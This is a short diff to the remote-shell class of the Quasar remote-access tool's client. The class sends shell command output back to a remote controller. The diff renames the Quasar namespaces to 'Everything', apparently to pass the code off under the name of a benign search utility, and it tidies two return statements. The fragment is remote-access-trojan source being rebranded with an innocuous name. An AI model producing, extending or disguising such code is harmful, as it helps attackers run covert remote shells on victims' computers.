@@ -1,4 +1,4 @@
-﻿using Quasar.Client.Networking;
+﻿using Everything.Networking;
 using Quasar.Common.Messages;
 using System;
 using System.Diagnostics;
@@ -7,7 +7,7 @@ using System.IO;
 using System.Text;
 using System.Threading;
 
-namespace Quasar.Client.IO
+namespace Everything.IO
 {
     /// <summary>
     /// This class manages a remote shell session.
@@ -147,11 +147,13 @@ namespace Quasar.Client.IO
         /// <param name="isError">True if reading from the error-stream, else False.</param>
         private void SendAndFlushBuffer(ref StringBuilder textBuffer, bool isError)
         {
-            if (textBuffer.Length == 0) return;
+            if (textBuffer.Length == 0)
+                return;
 
             var toSend = ConvertEncoding(_encoding, textBuffer.ToString());
 
-            if (string.IsNullOrEmpty(toSend)) return;
+            if (string.IsNullOrEmpty(toSend))
+                return;
 
             _client.Send(new DoShellExecuteResponse { Output = toSend, IsError = isError });
 
